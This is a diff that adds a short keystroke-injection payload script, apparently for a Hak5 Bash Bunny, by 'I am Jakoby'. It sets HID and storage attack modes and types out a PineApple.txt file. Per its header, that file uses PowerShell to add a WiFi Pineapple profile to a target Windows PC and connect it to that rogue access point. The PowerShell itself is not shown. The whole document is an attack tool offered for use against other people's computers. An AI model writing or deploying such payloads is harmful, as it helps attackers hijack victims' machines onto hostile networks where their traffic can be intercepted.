@@ -1,0 +1,20 @@
+# Title:         PineApple
+# Description:   This payload is meant to use powershell to add the network profile of your wifi pineapple to the targets PC and connect to it
+# Author:        I am Jakoby
+# Version:       1.0
+# Category:      General
+# Attackmodes:   HID, Storage
+# Target:        Windows 10, 11
+
+LED SETUP
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID STORAGE
+
+LED STAGE1
+
+QUACK DELAY 3000
+LED STAGE1
+QUACK ${SWITCH_POSITION}/PineApple.txt
+
